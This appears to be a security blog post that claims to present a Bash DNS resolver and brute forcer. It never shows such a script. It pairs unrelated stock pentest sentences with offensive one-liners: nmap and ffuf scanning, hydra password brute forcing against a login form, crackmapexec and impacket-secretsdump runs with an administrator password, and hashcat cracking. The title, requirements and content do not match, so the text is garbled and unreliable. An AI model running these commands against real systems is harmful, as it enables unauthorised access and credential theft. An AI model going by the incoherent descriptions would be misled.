---
TitleSEO: "DNS Resolver and Brute Forcer in Bash | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — Bash"
Author: "ZureFX"
Description: "A Bash script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "powershell, bash, scanner"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-598.html"
URL_IMAGES: ""
Date: "2025-02-19"
Tags: "PowerShell, Bash, Scanner"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-598"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-598.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Command injection was possible through unsanitized user input in the search functionality. Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `metasploit`
- `rubeus`
- `impacket`

## Implementation

### Core Logic

The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
nmap -sCV -p22,25,27017 10.97.94.224 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.81.241.152/FUZZ
crackmapexec smb 10.121.10.144 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

### Helper Functions

Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.19.112.80/FUZZ
nmap -sCV -p5986,143,3268 10.32.68.23 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.31.184.120 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.66.180.138
feroxbuster -h
```

### Advanced Options

The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.44.23.130
```

## Output

### Example Output

Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit.

```
[+] Scanning target...
[+] Found 17 results
[+] Done in 9.63s
```
